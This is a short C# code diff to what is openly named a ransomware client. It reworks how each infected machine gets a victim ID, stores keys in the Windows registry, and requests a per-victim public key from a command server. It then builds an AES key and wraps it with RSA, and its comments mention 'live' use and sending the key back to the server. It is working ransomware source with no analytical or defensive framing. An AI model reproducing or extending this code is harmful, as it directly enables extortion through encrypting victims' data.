@@ -19,18 +19,24 @@ namespace RansomwareClient
             var victim_id = Guid.NewGuid().ToString();
             //set keys
             Utility.SetRegistryKeyValuePair("Id", victim_id, false); //set to true for live
-            var server_key = Utility.RequestFromServer("publickey");
-            Utility.SetRegistryKeyValuePair("Server Public Key", server_key);
-            if (server_key == string.Empty)
+
+            var public_key = Utility.RequestFromServer($"ransom/{victim_id}");
+            if (public_key == string.Empty)
             {
                 //TODO: have some local keys public keys that can be swapped later for unique keys to allow continued encryption and force online access;
                 return;
             }
+            Utility.SetRegistryKeyValuePair("Public Key", public_key);
+
+            //this is support for encrypted AES key and sending back to the server
+
+            //var server_key = Utility.RequestFromServer("publickey");
+            //Utility.SetRegistryKeyValuePair("Server Public Key", server_key);
+            
             var AES = GetAES();
             var symmetric_key = Encoding.UTF8.GetBytes(Convert.ToBase64String(AES.Key.Concat(AES.IV).ToArray()));
-            var public_key = Utility.RequestFromServer($"ransom/{victim_id}");
 
-            Utility.SetRegistryKeyValuePair("Public Key", public_key);
+            //send symmetric_key (AES key) to server if desired 
 
             //encrypt symmetric key
             var RSA = new RSACryptoServiceProvider();
